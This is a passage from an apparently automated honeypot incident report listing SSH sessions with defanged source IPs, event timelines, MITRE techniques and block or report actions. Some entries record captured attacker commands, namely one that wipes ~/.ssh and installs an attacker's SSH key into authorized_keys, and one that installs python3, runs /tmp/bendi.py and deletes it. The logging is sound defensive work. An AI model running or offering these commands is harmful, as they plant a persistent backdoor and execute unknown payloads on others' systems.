| **Last Seen** | 2026-06-30 04:40 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:40:33` | `cowrie.session.connect` |
| `2026-06-30 04:40:33` | `cowrie.client.version` |
| `2026-06-30 04:40:33` | `cowrie.client.kex` |
| `2026-06-30 04:40:36` | `cowrie.login.success` |
| `2026-06-30 04:40:37` | `cowrie.session.params` |
| `2026-06-30 04:40:37` | `cowrie.command.input` |
| `2026-06-30 04:40:38` | `cowrie.log.closed` |
| `2026-06-30 04:40:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-81555c9439e3

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 04:44 |
| **Last Seen** | 2026-06-30 04:44 |
| **Session Duration** | 11s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:44:27` | `cowrie.session.connect` |
| `2026-06-30 04:44:28` | `cowrie.client.version` |
| `2026-06-30 04:44:28` | `cowrie.client.kex` |
| `2026-06-30 04:44:34` | `cowrie.login.success` |
| `2026-06-30 04:44:37` | `cowrie.session.params` |
| `2026-06-30 04:44:37` | `cowrie.command.input` |
| `2026-06-30 04:44:38` | `cowrie.log.closed` |
| `2026-06-30 04:44:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-fb3d7b536101

| Field | Detail |
|---|---|
| **Source IP** | `45.148.10[.]239` |
| **First Seen** | 2026-06-30 04:44 |
| **Last Seen** | 2026-06-30 04:44 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:44:42` | `cowrie.session.connect` |
| `2026-06-30 04:44:42` | `cowrie.client.version` |
| `2026-06-30 04:44:42` | `cowrie.client.kex` |
| `2026-06-30 04:44:43` | `cowrie.login.success` |
| `2026-06-30 04:44:43` | `cowrie.session.params` |
| `2026-06-30 04:44:43` | `cowrie.command.input` |
| `2026-06-30 04:44:43` | `cowrie.log.closed` |
| `2026-06-30 04:44:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.148.10[.]239` to AbuseIPDB if not already reported
- [ ] Block `45.148.10[.]239` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9659a296272e

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 04:55 |
| **Last Seen** | 2026-06-30 04:55 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:55:37` | `cowrie.session.connect` |
| `2026-06-30 04:55:37` | `cowrie.client.version` |
| `2026-06-30 04:55:37` | `cowrie.client.kex` |
| `2026-06-30 04:55:39` | `cowrie.login.success` |
| `2026-06-30 04:55:41` | `cowrie.session.params` |
| `2026-06-30 04:55:41` | `cowrie.command.input` |
| `2026-06-30 04:55:41` | `cowrie.log.closed` |
| `2026-06-30 04:55:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7ae66a04fe5e

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 04:56 |
| **Last Seen** | 2026-06-30 04:56 |
| **Session Duration** | 12s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:56:35` | `cowrie.session.connect` |
| `2026-06-30 04:56:36` | `cowrie.client.version` |
| `2026-06-30 04:56:36` | `cowrie.client.kex` |
| `2026-06-30 04:56:43` | `cowrie.login.success` |
| `2026-06-30 04:56:46` | `cowrie.session.params` |
| `2026-06-30 04:56:46` | `cowrie.command.input` |
| `2026-06-30 04:56:47` | `cowrie.log.closed` |
| `2026-06-30 04:56:47` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-ff298b6bfb36

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 04:59 |
| **Last Seen** | 2026-06-30 04:59 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 04:59:19` | `cowrie.session.connect` |
| `2026-06-30 04:59:19` | `cowrie.client.version` |
| `2026-06-30 04:59:19` | `cowrie.client.kex` |
| `2026-06-30 04:59:19` | `cowrie.login.success` |
| `2026-06-30 04:59:20` | `cowrie.session.params` |
| `2026-06-30 04:59:20` | `cowrie.command.input` |
| `2026-06-30 04:59:20` | `cowrie.log.closed` |
| `2026-06-30 04:59:20` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d70b967780c5

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 05:09 |
| **Last Seen** | 2026-06-30 05:09 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:09:24` | `cowrie.session.connect` |
| `2026-06-30 05:09:25` | `cowrie.client.version` |
| `2026-06-30 05:09:25` | `cowrie.client.kex` |
| `2026-06-30 05:09:32` | `cowrie.login.success` |
| `2026-06-30 05:09:36` | `cowrie.session.params` |
| `2026-06-30 05:09:36` | `cowrie.command.input` |
| `2026-06-30 05:09:38` | `cowrie.log.closed` |
| `2026-06-30 05:09:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-1cf4b4894a97

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 05:10 |
| **Last Seen** | 2026-06-30 05:10 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:10:39` | `cowrie.session.connect` |
| `2026-06-30 05:10:39` | `cowrie.client.version` |
| `2026-06-30 05:10:39` | `cowrie.client.kex` |
| `2026-06-30 05:10:42` | `cowrie.login.success` |
| `2026-06-30 05:10:43` | `cowrie.session.params` |
| `2026-06-30 05:10:43` | `cowrie.command.input` |
| `2026-06-30 05:10:43` | `cowrie.log.closed` |
| `2026-06-30 05:10:43` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-beb62a751a86

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 05:22 |
| **Last Seen** | 2026-06-30 05:22 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:22:30` | `cowrie.session.connect` |
| `2026-06-30 05:22:33` | `cowrie.client.version` |
| `2026-06-30 05:22:33` | `cowrie.client.kex` |
| `2026-06-30 05:22:38` | `cowrie.login.success` |
| `2026-06-30 05:22:42` | `cowrie.session.params` |
| `2026-06-30 05:22:42` | `cowrie.command.input` |
| `2026-06-30 05:22:44` | `cowrie.log.closed` |
| `2026-06-30 05:22:44` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9584bf5350c5

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 05:25 |
| **Last Seen** | 2026-06-30 05:25 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:25:55` | `cowrie.session.connect` |
| `2026-06-30 05:25:55` | `cowrie.client.version` |
| `2026-06-30 05:25:55` | `cowrie.client.kex` |
| `2026-06-30 05:25:57` | `cowrie.login.success` |
| `2026-06-30 05:25:58` | `cowrie.session.params` |
| `2026-06-30 05:25:58` | `cowrie.command.input` |
| `2026-06-30 05:25:58` | `cowrie.log.closed` |
| `2026-06-30 05:25:58` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-d3a881d37fde

| Field | Detail |
|---|---|
| **Source IP** | `41.218.110[.]114` |
| **First Seen** | 2026-06-30 05:33 |
| **Last Seen** | 2026-06-30 05:33 |
| **Session Duration** | 6s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:33:09` | `cowrie.session.connect` |
| `2026-06-30 05:33:09` | `cowrie.client.version` |
| `2026-06-30 05:33:09` | `cowrie.client.kex` |
| `2026-06-30 05:33:10` | `cowrie.login.success` |
| `2026-06-30 05:33:11` | `cowrie.session.params` |
| `2026-06-30 05:33:11` | `cowrie.command.input` |
| `2026-06-30 05:33:11` | `cowrie.command.failed` |
| `2026-06-30 05:33:11` | `cowrie.log.closed` |
| `2026-06-30 05:33:12` | `cowrie.session.params` |
| `2026-06-30 05:33:12` | `cowrie.command.input` |
| `2026-06-30 05:33:12` | `cowrie.session.file_download` |
| `2026-06-30 05:33:12` | `cowrie.log.closed` |
| `2026-06-30 05:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.218.110[.]114` to AbuseIPDB if not already reported
- [ ] Block `41.218.110[.]114` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-97cfd1c6627b

| Field | Detail |
|---|---|
| **Source IP** | `41.218.110[.]114` |
| **First Seen** | 2026-06-30 05:33 |
| **Last Seen** | 2026-06-30 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:33:13` | `cowrie.session.connect` |
| `2026-06-30 05:33:13` | `cowrie.client.version` |
| `2026-06-30 05:33:13` | `cowrie.client.kex` |
| `2026-06-30 05:33:14` | `cowrie.login.success` |
| `2026-06-30 05:33:14` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.218.110[.]114` to AbuseIPDB if not already reported
- [ ] Block `41.218.110[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-67cde95dd412

| Field | Detail |
|---|---|
| **Source IP** | `41.218.110[.]114` |
| **First Seen** | 2026-06-30 05:33 |
| **Last Seen** | 2026-06-30 05:33 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:33:14` | `cowrie.session.connect` |
| `2026-06-30 05:33:14` | `cowrie.client.version` |
| `2026-06-30 05:33:14` | `cowrie.client.kex` |
| `2026-06-30 05:33:15` | `cowrie.login.success` |
| `2026-06-30 05:33:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `41.218.110[.]114` to AbuseIPDB if not already reported
- [ ] Block `41.218.110[.]114` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-53369004d5e9

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 05:35 |
| **Last Seen** | 2026-06-30 05:35 |
| **Session Duration** | 14s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:35:26` | `cowrie.session.connect` |
| `2026-06-30 05:35:28` | `cowrie.client.version` |
| `2026-06-30 05:35:28` | `cowrie.client.kex` |
| `2026-06-30 05:35:35` | `cowrie.login.success` |
| `2026-06-30 05:35:39` | `cowrie.session.params` |
| `2026-06-30 05:35:39` | `cowrie.command.input` |
| `2026-06-30 05:35:41` | `cowrie.log.closed` |
| `2026-06-30 05:35:41` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3030637470a2

| Field | Detail |
|---|---|
| **Source IP** | `185.242.3[.]195` |
| **First Seen** | 2026-06-30 05:35 |
| **Last Seen** | 2026-06-30 05:35 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:35:29` | `cowrie.session.connect` |
| `2026-06-30 05:35:29` | `cowrie.client.version` |
| `2026-06-30 05:35:29` | `cowrie.client.kex` |
| `2026-06-30 05:35:30` | `cowrie.login.success` |
| `2026-06-30 05:35:30` | `cowrie.session.params` |
| `2026-06-30 05:35:30` | `cowrie.command.input` |
| `2026-06-30 05:35:31` | `cowrie.log.closed` |
| `2026-06-30 05:35:31` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `185.242.3[.]195` to AbuseIPDB if not already reported
- [ ] Block `185.242.3[.]195` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-3e575fb61345

| Field | Detail |
|---|---|
| **Source IP** | `45.205.1[.]42` |
| **First Seen** | 2026-06-30 05:41 |
| **Last Seen** | 2026-06-30 05:41 |
| **Session Duration** | 4s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:41:22` | `cowrie.session.connect` |
| `2026-06-30 05:41:22` | `cowrie.client.version` |
| `2026-06-30 05:41:22` | `cowrie.client.kex` |
| `2026-06-30 05:41:24` | `cowrie.login.success` |
| `2026-06-30 05:41:26` | `cowrie.session.params` |
| `2026-06-30 05:41:26` | `cowrie.command.input` |
| `2026-06-30 05:41:27` | `cowrie.log.closed` |
| `2026-06-30 05:41:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.205.1[.]42` to AbuseIPDB if not already reported
- [ ] Block `45.205.1[.]42` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-2f5861d82a53

| Field | Detail |
|---|---|
| **Source IP** | `45.198.224[.]120` |
| **First Seen** | 2026-06-30 05:48 |
| **Last Seen** | 2026-06-30 05:48 |
| **Session Duration** | 13s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `echo OK` |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:48:24` | `cowrie.session.connect` |
| `2026-06-30 05:48:26` | `cowrie.client.version` |
| `2026-06-30 05:48:26` | `cowrie.client.kex` |
| `2026-06-30 05:48:32` | `cowrie.login.success` |
| `2026-06-30 05:48:37` | `cowrie.session.params` |
| `2026-06-30 05:48:37` | `cowrie.command.input` |
| `2026-06-30 05:48:38` | `cowrie.log.closed` |
| `2026-06-30 05:48:38` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `45.198.224[.]120` to AbuseIPDB if not already reported
- [ ] Block `45.198.224[.]120` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-9dfd97a1ab44

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 05:49 |
| **Last Seen** | 2026-06-30 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:49:17` | `cowrie.session.connect` |
| `2026-06-30 05:49:17` | `cowrie.client.version` |
| `2026-06-30 05:49:17` | `cowrie.client.kex` |
| `2026-06-30 05:49:17` | `cowrie.login.success` |
| `2026-06-30 05:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-36f4e62eb274

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 05:49 |
| **Last Seen** | 2026-06-30 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:49:17` | `cowrie.session.connect` |
| `2026-06-30 05:49:17` | `cowrie.client.version` |
| `2026-06-30 05:49:17` | `cowrie.client.kex` |
| `2026-06-30 05:49:17` | `cowrie.login.success` |
| `2026-06-30 05:49:17` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-66ebae0f1984

| Field | Detail |
|---|---|
| **Source IP** | `129.153.145[.]135` |
| **First Seen** | 2026-06-30 05:49 |
| **Last Seen** | 2026-06-30 05:49 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:49:27` | `cowrie.session.connect` |
| `2026-06-30 05:49:27` | `cowrie.client.version` |
| `2026-06-30 05:49:27` | `cowrie.client.kex` |
| `2026-06-30 05:49:27` | `cowrie.login.success` |
| `2026-06-30 05:49:27` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `129.153.145[.]135` to AbuseIPDB if not already reported
- [ ] Block `129.153.145[.]135` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-eaf2f68ea820

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:08` | `cowrie.session.connect` |
| `2026-06-30 05:52:08` | `cowrie.client.version` |
| `2026-06-30 05:52:09` | `cowrie.client.kex` |
| `2026-06-30 05:52:10` | `cowrie.login.success` |
| `2026-06-30 05:52:10` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-82e1e7cb523c

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:52 |
| **Session Duration** | 1s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:10` | `cowrie.session.connect` |
| `2026-06-30 05:52:10` | `cowrie.client.version` |
| `2026-06-30 05:52:10` | `cowrie.client.kex` |
| `2026-06-30 05:52:11` | `cowrie.login.success` |
| `2026-06-30 05:52:11` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `168.110.102[.]254` to AbuseIPDB if not already reported
- [ ] Block `168.110.102[.]254` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-c9f5d9e79369

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:52 |
| **Session Duration** | 3s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `cd ~; chattr -ia .ssh; lockr -ia .ssh, cd ~ && rm -rf .ssh && mkdir .ssh && echo "ssh-rsa AAAAB3NzaC1yc2EAAAABJQAAAQEArDp4cun2lhr4KUhBGE7VvAcwdli2a8dbnrTOrbMz1+5O73fcBOx8NVbUT0bUanUV9tJ2/9p7+vD0EpZ3Tz/+0kX34uAx1RV/75GVOmNx+9EuWOnvNoaJe0QXxziIg9eLBHpgLMuakb5+BgTFB+rKJAw9u9FSTDengvS8hX1kNFS4Mjux0hJOK8rvcEmPecjdySYMb66nylAKGwCEE6WEQHmd1mUPgHwGQ0hWCwsQk13yCGPK5w6hYp5zYkFnvlC8hGmd4Ww+u97k6pfTGTUbJk14ujvcD9iUKQTTWYYjIIu5PmUux5bsZ0R4WFwdIe6+i6rBLAsPKgAySVKPRK+oRw== mdrfckr">>.ssh/authorized_keys && chmod -R go= ~/.ssh && cd ~` |
| **Download Attempts** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 |
| **Malware Analysis** | a8460f446be540410004b1a8db4083773fa46f7fe76fa84219c93daa1669f8f2 (LOW) |
| **TTPs (MITRE)** | T1021.004 · T1078 · T1105 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:12` | `cowrie.session.connect` |
| `2026-06-30 05:52:12` | `cowrie.client.version` |
| `2026-06-30 05:52:12` | `cowrie.client.kex` |
| `2026-06-30 05:52:12` | `cowrie.login.success` |
| `2026-06-30 05:52:13` | `cowrie.session.params` |
| `2026-06-30 05:52:13` | `cowrie.command.input` |
| `2026-06-30 05:52:13` | `cowrie.command.failed` |
| `2026-06-30 05:52:13` | `cowrie.log.closed` |
| `2026-06-30 05:52:14` | `cowrie.session.params` |
| `2026-06-30 05:52:14` | `cowrie.command.input` |
| `2026-06-30 05:52:14` | `cowrie.session.file_download` |
| `2026-06-30 05:52:14` | `cowrie.log.closed` |
| `2026-06-30 05:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Review commands for lateral movement indicators
- [ ] Submit download hash(es) to VirusTotal
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-5491860a7d31

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:14` | `cowrie.session.connect` |
| `2026-06-30 05:52:14` | `cowrie.client.version` |
| `2026-06-30 05:52:14` | `cowrie.client.kex` |
| `2026-06-30 05:52:14` | `cowrie.login.success` |
| `2026-06-30 05:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-0d311be99dd6

| Field | Detail |
|---|---|
| **Source IP** | `54.37.229[.]48` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:52 |
| **Session Duration** | 0s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **TTPs (MITRE)** | T1078 · T1592 |

**Attack Timeline:**

| Time (UTC) | Event |
|---|---|
| `2026-06-30 05:52:15` | `cowrie.session.connect` |
| `2026-06-30 05:52:15` | `cowrie.client.version` |
| `2026-06-30 05:52:15` | `cowrie.client.kex` |
| `2026-06-30 05:52:15` | `cowrie.login.success` |
| `2026-06-30 05:52:15` | `cowrie.session.closed` |

**Recommended Actions:**
- [ ] Submit `54.37.229[.]48` to AbuseIPDB if not already reported
- [ ] Block `54.37.229[.]48` at perimeter firewall / security group
- [ ] Escalate to Tier 2 if pattern repeats next shift

### 🔴 HIGH · IR-7f5d4f535dce

| Field | Detail |
|---|---|
| **Source IP** | `168.110.102[.]254` |
| **First Seen** | 2026-06-30 05:52 |
| **Last Seen** | 2026-06-30 05:54 |
| **Session Duration** | 130s |
| **Login Attempts** | 1 |
| **Auth Success** | ✅ Yes — session established |
| **Commands Executed** | `command -v python3 >/dev/null 2>&1 || (apt-get update -y && apt-get install -y python3) || yum install -y python3, apt-get update -y, apt-get install -y python3, python3 /tmp/bendi.py, rm /tmp/bendi.py` |
| **TTPs (MITRE)** | T1059.004 · T1078 · T1105 · T1592 |

